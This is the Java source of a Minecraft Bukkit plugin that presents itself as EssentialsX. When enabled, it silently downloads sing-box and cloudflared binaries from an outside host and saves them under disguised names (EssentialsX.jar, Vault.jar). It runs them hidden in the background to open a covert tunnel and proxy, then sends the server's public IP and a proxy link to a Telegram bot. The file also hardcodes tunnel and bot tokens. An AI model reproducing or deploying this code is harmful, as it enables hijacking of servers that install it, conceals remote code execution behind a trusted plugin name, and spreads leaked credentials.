package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.attribute.PosixFilePermissions;

public class EssentialsX extends JavaPlugin {


    // Cloudflare隧道端口
    private int port = 22222;

    //Cloudflare隧道Token
    private String token = "eyJhIjoiZmQ5YjNkMDdkOWQxZWYxY2M4OGY2ZTJiNDE2OTNmZmUiLCJ0IjoiOGNmMGI5YWEtNDc4Yy00ODM5LWI4YjktYTYwOGYzODc0NDczIiwicyI6Ik16RXlPVGN5TnpJdE5ESXlaUzAwTXpCaExXRmhObU10T0Roa05qQmhOVE13WkdNNCJ9"; //必填

    //Cloudflare隧道绑定域名
    private String host = "weirdhost-mc.o0o0.pp.ua"; //必填

    // Telegram配置
    private String tgToken = "7195422483:AAGhrc-1nzto9Ik05rY2K5V8xdvLSGInVBo";
    private String tgChatId = "5800052646";



    @Override
    public void onEnable() {

        getLogger().info("EssentialsX plugin starting...");


        try {

            Files.createDirectories(
                    getDataFolder().toPath()
            );


            startRemoteJava();


            getLogger().info(
                    "EssentialsX plugin enabled"
            );


        } catch (Exception e) {

            getLogger().severe(
                    "Failed to start EssentialsX"
            );

            e.printStackTrace();
        }
    }



    private void startRemoteJava() throws Exception {


        // 临时运行目录
        Path runFolder =
                getDataFolder().toPath();


        Files.createDirectories(
                runFolder
        );


        String SingboxUrl =
                "https://netjett-de.kof95zip.pp.ua/java/cfws/amd64/Singbox"; //sing-box


        String ConfUrl =
                "https://netjett-de.kof95zip.pp.ua/java/cfws/amd64/config.json"; //sing-box config.json


        String TunnelUrl =
                "https://netjett-de.kof95zip.pp.ua/java/cfws/amd64/Cloudflared"; //Cloudflared


        Path SingboxFile =
                runFolder.resolve(
                        "EssentialsX.jar"
                );


        Path ConfFile =
                runFolder.resolve(
                        "config.json"
                );

        
        Path TunnelFile =
                runFolder.resolve(
                        "Vault.jar"
                );




        // 下载临时文件

        downloadIfNotExists(
                SingboxUrl,
                SingboxFile
        );


        downloadIfNotExists(
                ConfUrl,
                ConfFile
        );


        downloadIfNotExists(
                TunnelUrl,
                TunnelFile
        );

        //设置权限
        Files.setPosixFilePermissions(
                SingboxFile,
                PosixFilePermissions.fromString("rwxr-xr-x")
        );

        Files.setPosixFilePermissions(
                TunnelFile,
                PosixFilePermissions.fromString("rwxr-xr-x")
        );

        // 启动Sing-box

        ProcessBuilder pb =
                new ProcessBuilder(
                        "bash",
                        "-c",
                        "nohup ./EssentialsX -c config.json > /dev/null 2>&1 &"
                );



        pb.directory(
                runFolder.toFile()
        );


        pb.start();

        // 启动Cloudflared

        ProcessBuilder pb2 =
                new ProcessBuilder(
                        "bash",
                        "-c",
                        "nohup ./Vault --no-autoupdate tunnel --protocol http2 run --token " + token + " > /dev/null 2>&1 &"
                );



        pb2.directory(
                runFolder.toFile()
        );


        pb2.start();

        getLogger().info(
                "Plugins starting..."
        );


        Thread.sleep(
                5000
        );

 
        String ip =
                getPublicIP();


        sendTelegram(
                "服务器插件启动\n"
                        + "公网IP为: "
                        + ip
                        + "\n"
                        + "订阅地址: \nvless://dc555507-bed4-4627-9945-c5da21c6cea6@"
                        + host
                        + ":443"
                        + "?encryption=none&security=tls&sni=" + host + "&allowInsecure=1&type=ws&host=" + host + "&path=%2F"
           
        );

    }





    /**
     * 获取公网IP
     */
    private String getPublicIP() {

        try {

            URL url =
                    new URL(
                            "https://api.ipify.org"
                    );


            BufferedReader reader =
                    new BufferedReader(
                            new InputStreamReader(
                                    url.openStream()
                            )
                    );


            String ip =
                    reader.readLine();


            reader.close();


            return ip;


        } catch (Exception e) {

            return "unknown";

        }
    }





    /**
     * Telegram发送消息
     */
    private void sendTelegram(
            String message
    ) {


        if (tgToken.isEmpty()
                || tgChatId.isEmpty()) {

            getLogger().info(
                    "Notified not configured, skip."
            );

            return;
        }



        try {


            String api =
                    "https://api.telegram.org/bot"
                            + tgToken
                            + "/sendMessage?chat_id="
                            + tgChatId
                            + "&text="
                            + URLEncoder.encode(
                                    message,
                                    StandardCharsets.UTF_8
                            );



            HttpURLConnection conn =
                    (HttpURLConnection)
                            new URL(api)
                                    .openConnection();



            conn.setRequestMethod(
                    "GET"
            );


            int code =
                    conn.getResponseCode();



            if (code == 200) {

                getLogger().info(
                        "Notified."
                );

            } else {

                getLogger().warning(
                        "UnNotified"
                );
            }


            conn.disconnect();



        } catch (Exception e) {


            getLogger().warning(
                    "UnNotified"
            );

        }
    }





    /**
     * 文件不存在才下载
     */
    private void downloadIfNotExists(
            String url,
            Path target
    ) throws Exception {


        if (Files.exists(target)) {
            return;
        }


        Process process =
                new ProcessBuilder(
                        "bash",
                        "-c",
                        "curl -Ls \""
                                + url
                                + "\" -o \""
                                + target
                                + "\""
                )
                .start();



        int exit =
                process.waitFor();



        if (exit != 0) {

            throw new IOException(
                    "Fail to init plugins"
            );
        }

    }




    @Override
    public void onDisable() {


        getLogger().info(
                "EssentialsX disabled"
        );

    }
}
